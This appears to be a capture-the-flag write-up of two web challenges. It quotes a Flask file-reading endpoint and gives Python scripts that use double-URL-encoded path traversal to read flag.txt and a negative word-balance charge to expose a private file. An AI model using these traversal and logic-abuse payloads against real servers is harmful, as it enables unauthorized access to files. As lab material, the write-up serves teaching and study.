# Novel reader I & II

## Challenge Description

We have many fun novels for ya...

## Novel Reader I

### Vunerability Analysis

Upon examining the website's 'read novel' functionality, I noticed a potential exploit in the readNovel function:

```python
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
```

The key observation was that the function reads any file with a path starting with `public/`.

The `readFile` function is shown below:

```python
def readFile(path):
    f = open(path,'r')
    buf = f.read(0x1000)
    f.close()
    return buf
```

This implementation is susceptible to path traversal attacks.

### Exploit

To exploit this vulnerability, I crafted a script to read the server's files:

```python
import requests

url = "http://3.64.250.135:9000/api/read/public/..%252F../flag.txt"
response = requests.get(url)
print(response.text)
```

## Novel Reader II

The Novel Reader II challenge extends from the previous one, where the objective was to access a longer file.

### Vunerability Analysis

A notable constraint was the limited account balance, insufficient to read the entire file. However, through experimentation, I discovered a loophole that allowed charging negative words to our account. The implementation of the word limit was such that a negative balance, specifically -1 words, permitted access to the entire file.

### Exploiting the word limit

```python
buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
```

### Exploit

To exploit this vulnerability, I wrote the following script:

```python
import requests

url = "http://3.64.250.135:9000/api/read/public/%2E%2E%252Fprivate/A-Secret-Tale.txt"

session = requests.Session()


set_words_request_response = session.post(
    "http://3.64.250.135:9000/api/charge?nwords=-2")

get_words_balance_request_response = session.get(
    "http://3.64.250.135:9000/api/stats")

print(get_words_balance_request_response.text)


response = session.get(url)
print(response.text)
```
